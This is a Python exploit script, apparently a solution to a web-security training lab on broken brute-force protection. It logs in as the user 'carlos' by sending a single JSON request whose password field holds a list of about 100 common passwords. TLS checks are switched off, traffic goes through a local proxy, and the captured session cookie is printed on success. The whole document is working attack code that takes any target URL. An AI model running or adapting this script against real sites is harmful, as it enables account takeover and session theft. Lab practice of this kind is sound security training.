import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#Lab: Broken brute-force protection, multiple credentials per request

proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

passwords=["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon",
 "123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop",
 "123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000",
 "qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer",
 "harley","batman","andrew","tigger","onceuponatime","sunshine","iloveyou","2000","charlie","robert","thomas",
 "hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper",
 "1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger",
 "princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access",
 "yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor",
 "monitoring","montana","moon","moscow","random"]

def multi_ps(session,url):
    url=url+"/login"
    #Get all the passwords ready for JSON format by passing them all in a list inside use proxie to see .
    json_data={"username":"carlos","password":passwords}
    response=session.post(url,json=json_data,verify=False,proxies=proxie)
    if "Log out" in response.text:
        print("(+) Login successfully.")
        session_value=session.cookies.get_dict()
        print("(+) Session : %s" %list(session_value.values())[0])
        sys.exit()
    else:
        print('(-) Error')
        sys.exit(-1)


def main():
    if len(sys.argv)!=2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s www.site.com'%sys.argv[0])
        sys.exit(-1)
    
    session=requests.session()
    url=sys.argv[1]
    multi_ps(session,url)

if __name__=='__main__':
    main()